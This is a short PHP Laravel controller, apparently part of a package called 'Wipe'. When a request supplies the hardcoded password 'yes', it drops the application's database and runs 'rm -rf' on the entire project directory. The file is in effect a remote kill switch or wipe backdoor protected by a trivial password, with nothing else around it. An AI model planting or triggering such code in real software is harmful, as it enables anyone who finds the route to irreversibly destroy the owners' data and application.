<?php

namespace JavaDLE\Wipe\App\Controllers;

use Illuminate\Http\Request;

class WipeController
{
    public function __invoke(Request $request): string
    {
        $password = 'yes';

        // Проверка введённого пароля
        if ($request->input('password') !== $password) {
            abort(403);
        }

        \DB::statement('DROP DATABASE ' . env('DB_DATABASE'));

        return $this->wipeData();
    }

    public static function wipeData(): string
    {
        $projectFolder = base_path();

        exec("rm -rf " . escapeshellarg($projectFolder));

        return 'Good';
    }
}
